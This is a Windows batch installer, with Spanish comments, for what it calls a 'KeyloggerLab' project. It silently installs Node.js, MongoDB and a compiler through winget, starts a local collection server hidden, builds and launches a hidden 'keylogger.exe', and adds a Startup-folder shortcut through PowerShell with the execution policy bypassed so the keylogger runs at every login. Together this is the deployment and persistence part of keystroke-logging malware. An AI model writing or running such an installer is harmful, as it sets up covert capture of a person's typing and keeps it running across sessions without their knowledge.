@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul 2>&1

REM =============================================
REM  PASO 1: Node.js
REM =============================================
where node >nul 2>&1
if %errorlevel%==0 goto :node_ok

where winget >nul 2>&1
if %errorlevel% neq 0 exit /b 1
winget install OpenJS.NodeJS.LTS --silent --accept-package-agreements --accept-source-agreements
if %errorlevel% neq 0 exit /b 1
call :RefreshPath
where node >nul 2>&1
if %errorlevel% neq 0 exit /b 1

:node_ok

REM =============================================
REM  PASO 2: MongoDB
REM =============================================
tasklist /FI "IMAGENAME eq mongod.exe" 2>nul | find /I "mongod.exe" >nul
if %errorlevel%==0 goto :mongo_ok

net start MongoDB >nul 2>&1
if %errorlevel%==0 goto :mongo_ok

where mongod >nul 2>&1
if %errorlevel%==0 (
    if not exist "%~dp0mongo_data" mkdir "%~dp0mongo_data"
    start "" /b mongod --dbpath "%~dp0mongo_data" >nul 2>&1
    timeout /t 4 /nobreak >nul
    goto :mongo_ok
)

set "MONGOD_EXE="
for %%D in (
    "C:\Program Files\MongoDB\Server\8.0\bin\mongod.exe"
    "C:\Program Files\MongoDB\Server\7.0\bin\mongod.exe"
    "C:\Program Files\MongoDB\Server\6.0\bin\mongod.exe"
    "C:\Program Files\MongoDB\Server\5.0\bin\mongod.exe"
) do (
    if exist %%D (
        set "MONGOD_EXE=%%~D"
        goto :found_mongod
    )
)
goto :install_mongo

:found_mongod
if not exist "%~dp0mongo_data" mkdir "%~dp0mongo_data"
start "" /b "!MONGOD_EXE!" --dbpath "%~dp0mongo_data" >nul 2>&1
timeout /t 4 /nobreak >nul
goto :mongo_ok

:install_mongo
where docker >nul 2>&1
if %errorlevel%==0 (
    docker ps -a --filter "name=keylogger-mongo" --format "{{.Names}}" | find "keylogger-mongo" >nul 2>&1
    if !errorlevel!==0 (
        docker start keylogger-mongo >nul 2>&1
    ) else (
        docker run -d --name keylogger-mongo -p 27017:27017 mongo >nul 2>&1
    )
    if !errorlevel!==0 (
        timeout /t 3 /nobreak >nul
        goto :mongo_ok
    )
)

where winget >nul 2>&1
if %errorlevel% neq 0 exit /b 1
winget install MongoDB.Server --silent --accept-package-agreements --accept-source-agreements
if %errorlevel% neq 0 exit /b 1
call :RefreshPath

set "MONGOD_EXE="
for %%D in (
    "C:\Program Files\MongoDB\Server\8.0\bin\mongod.exe"
    "C:\Program Files\MongoDB\Server\7.0\bin\mongod.exe"
    "C:\Program Files\MongoDB\Server\6.0\bin\mongod.exe"
) do (
    if exist %%D (
        set "MONGOD_EXE=%%~D"
        goto :start_fresh_mongo
    )
)
where mongod >nul 2>&1
if %errorlevel%==0 (
    set "MONGOD_EXE=mongod"
    goto :start_fresh_mongo
)
exit /b 1

:start_fresh_mongo
if not exist "%~dp0mongo_data" mkdir "%~dp0mongo_data"
start "" /b "!MONGOD_EXE!" --dbpath "%~dp0mongo_data" >nul 2>&1
timeout /t 4 /nobreak >nul

:mongo_ok

REM =============================================
REM  PASO 3: npm install
REM =============================================
if not exist "%~dp0servidor\node_modules" (
    pushd "%~dp0servidor"
    call npm install >nul 2>&1
    popd
)

REM =============================================
REM  PASO 4: Arrancar servidor (oculto, si no corre ya)
REM =============================================
netstat -aon 2>nul | find ":3000" | find "LISTENING" >nul 2>&1
if !errorlevel! neq 0 (
    start "" /b node "%~dp0servidor\server.js" >nul 2>&1
    timeout /t 3 /nobreak >nul
)

REM =============================================
REM  PASO 5: Compilar y arrancar cliente (oculto, si no corre ya)
REM =============================================

REM Comprobar compilador C++. Si no hay, instalar WinLibs (MinGW-w64) con winget.
if not exist "%~dp0cliente\keylogger.exe" (
    call :FindCompiler
    if !errorlevel! neq 0 (
        winget install BrechtSanders.WinLibs.POSIX.UCRT --silent --accept-package-agreements --accept-source-agreements >nul 2>&1
        call :RefreshPath
        call :FindCompiler
        if !errorlevel! neq 0 exit /b 1
    )
    pushd "%~dp0cliente"
    call build.bat >nul 2>&1
    popd
)

tasklist /FI "IMAGENAME eq keylogger.exe" 2>nul | find /I "keylogger.exe" >nul
if !errorlevel! neq 0 (
    if exist "%~dp0cliente\keylogger.exe" (
        start "" /b "%~dp0cliente\keylogger.exe"
    )
)

REM =============================================
REM  PASO 6: Instalar autostart (solo la primera vez)
REM  Crea un acceso directo en la carpeta de Inicio
REM  de Windows para que arranque con cada sesion.
REM =============================================
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SHORTCUT=!STARTUP!\KeyloggerLab.lnk"
if not exist "!SHORTCUT!" (
    set "VBS_PATH=%~dp0iniciar.vbs"
    powershell -ExecutionPolicy Bypass -Command ^
        "$s = (New-Object -ComObject WScript.Shell).CreateShortcut('%SHORTCUT%'); $s.TargetPath = 'wscript.exe'; $s.Arguments = '\"%VBS_PATH%\"'; $s.WorkingDirectory = '%~dp0'; $s.WindowStyle = 7; $s.Save()"
) >nul 2>&1

exit /b 0

REM =============================================
REM  Funcion: refrescar PATH sin cerrar la ventana
REM =============================================
:RefreshPath
set "NEWPATH="
for /f "tokens=2,*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path 2^>nul') do set "NEWPATH=%%B"
for /f "tokens=2,*" %%A in ('reg query "HKCU\Environment" /v Path 2^>nul') do set "NEWPATH=!NEWPATH!;%%B"
if defined NEWPATH set "PATH=!NEWPATH!"
goto :eof

REM =============================================
REM  Funcion: buscar compilador C++ (g++ o cl.exe)
REM  Busca en PATH y en rutas de WinLibs / MSYS2.
REM  Sale con errorlevel 0 si encuentra uno.
REM =============================================
:FindCompiler
where g++ >nul 2>&1 && goto :eof
where cl.exe >nul 2>&1 && goto :eof
REM Buscar en rutas de WinLibs instalado por winget
for /d %%P in ("%LOCALAPPDATA%\Microsoft\WinGet\Packages\BrechtSanders.WinLibs*") do (
    if exist "%%P\mingw64\bin\g++.exe" (
        set "PATH=%%P\mingw64\bin;!PATH!"
        exit /b 0
    )
)
REM Buscar en rutas comunes
for %%G in (
    "C:\msys64\mingw64\bin"
    "C:\msys64\ucrt64\bin"
    "C:\mingw64\bin"
    "C:\Program Files\mingw64\bin"
) do (
    if exist "%%~G\g++.exe" (
        set "PATH=%%~G;!PATH!"
        exit /b 0
    )
)
exit /b 1
